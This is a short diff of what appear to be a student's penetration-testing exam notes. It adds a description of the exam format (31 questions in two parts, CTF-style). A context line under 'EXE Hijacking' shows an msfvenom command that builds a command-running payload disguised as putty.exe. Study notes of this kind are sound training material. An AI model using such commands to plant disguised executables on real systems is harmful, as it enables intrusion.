@@ -961,7 +961,13 @@ EXE Hijacking
 ----
 msfvenom -p windows/exec CMD="cmd.exe /C whoami > "C:\\whoami.txt"" -b '\x00' -f exe > putty.exe
 
-
+EXAM
+-----------------
+31 questions each is 5 points
+After part 1 is finished you cannot go back
+16 part 1 15 part 2
+questions more along the lines of inferring what to do
+test question formatting is similar to CTF
 
 
 
